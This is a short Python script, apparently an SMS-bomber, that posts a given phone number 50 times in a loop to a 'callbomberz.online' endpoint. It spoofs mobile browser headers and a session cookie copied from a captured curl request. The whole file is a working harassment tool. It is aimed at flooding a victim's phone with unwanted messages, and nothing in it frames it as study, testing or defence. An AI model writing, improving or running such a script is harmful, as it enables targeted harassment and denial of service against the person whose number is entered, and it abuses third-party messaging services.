import requests
import time

def smsgg(number):
    number = str(number)

    # Define the API endpoint and headers based on the provided curl command
    apis = [
        {
            "url": "https://callbomberz.online/sms.php",
            "method": "POST",
            "headers": {
                "Host": "callbomberz.online",
                "Connection": "keep-alive",
                "Content-Length": "17",  # This can be omitted; requests handles it automatically
                "sec-ch-ua": '"Chromium";v="128", "Not;A=Brand";v="24", "Android WebView";v="128"',
                "Content-Type": "application/x-www-form-urlencoded",
                "sec-ch-ua-mobile": "?1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-S928B Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.148 Mobile Safari/537.36",
                "sec-ch-ua-platform": '"Android"',
                "Accept": "*/*",
                "Origin": "https://callbomberz.online",
                "X-Requested-With": "pure.lite.browser",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://callbomberz.online/",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8",
                "Cookie": "_ga=GA1.1.1017096563.1728221082; _ga_PRCFSBPJJG=GS1.1.1728221082.1.1.1728221107.0.0.0"
            },
            "data": {
                "number": number
            }
        }
    ]
    
    for _ in range(50):  # Reduced number of iterations
        for api in apis:
            try:
                if api["method"] == "POST":
                    response = requests.post(api["url"], headers=api["headers"], data=api.get("data"))
                else:
                    response = requests.get(api["url"], headers=api["headers"])

                # Check for successful response
                if response.ok:
                    print(f"API {api['url']} response: {response.status_code}, {response.text}")
                else:
                    print(f"API {api['url']} returned an error: {response.status_code}, {response.text}")
            except Exception as e:
                print(f"Error calling {api['url']}: {str(e)}")
            
            # Optional delay between requests
            #time.sleep(2)  # Uncomment if you want to add a delay

# Example usage
